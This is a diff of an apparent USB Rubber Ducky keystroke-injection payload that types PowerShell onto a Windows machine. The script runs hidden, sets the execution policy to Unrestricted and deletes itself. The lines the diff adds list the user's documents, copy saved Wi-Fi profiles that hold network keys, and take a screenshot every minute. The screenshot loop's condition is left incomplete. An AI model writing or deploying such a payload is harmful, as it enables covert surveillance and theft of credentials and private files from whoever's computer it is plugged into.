@@ -76,7 +76,7 @@ STRING Remove-Item $MyINvocation.InvocationName
 ENTER
 CTRL s
 DELAY 750    
-STRING C:\Windows\config-84124.ps1
+STRING C:\Windows\config-38220.ps1
 ENTER
 DELAY 1000
 ALT F4 
@@ -100,7 +100,7 @@ ENTER
 STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
 ENTER 
 DELAY 750  
-STRING powershell.exe -windowstyle hidden -File C:\Windows\config-84124.ps1
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-38220.ps1
 ENTER
 STRING $UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired  
 ENTER 
@@ -116,3 +116,50 @@ STRING $Report =  $Report + "<div id=left><h3>User Information</h3><br><table><t
 ENTER  
 STRING $Report = $Report + '</div>' 
 ENTER
+STRING $Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>' 
+ENTER 
+STRING $Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.pdf, *.zip, *.rar -Recurse |convertto-html Directory, Name, LastAccessTime) 
+ENTER  
+STRING $Report = $Report + '</div>' 
+ENTER
+STRING $wlanSaveDir = New-Item $userDir'\Duck\WLAN_PROFILES' -ItemType Directory
+ENTER 
+STRING $srcDir = 'C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces'
+ENTER 
+STRING Copy-Item $srcDir $wlanSaveDir -Recurse  
+ENTER
+STRING $jpegSaveDir = New-Item $fileSaveDir'\Screenshots' -ItemType Directory
+ENTER
+STRING $x = 0
+ENTER
+STRING do { Start-Sleep -Seconds 60
+ENTER
+STRING $jpegName = (get-date).ToString('HHmmss')
+ENTER
+STRING $File = "$jpegSaveDir\$jpegName.bmp"
+ENTER
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING Add-type -AssemblyName System.Drawing
+ENTER
+STRING $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+ENTER
+STRING $Width = $Screen.Width
+ENTER
+STRING $Height = $Screen.Height
+ENTER
+STRING $Left = $Screen.Left
+ENTER
+STRING $Top = $Screen.Top
+ENTER
+STRING $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+ENTER
+STRING $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+ENTER
+STRING $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+ENTER
+STRING $bitmap.Save($File)
+ENTER
+STRING $x++  } while ($x -ne );
+ENTER
+
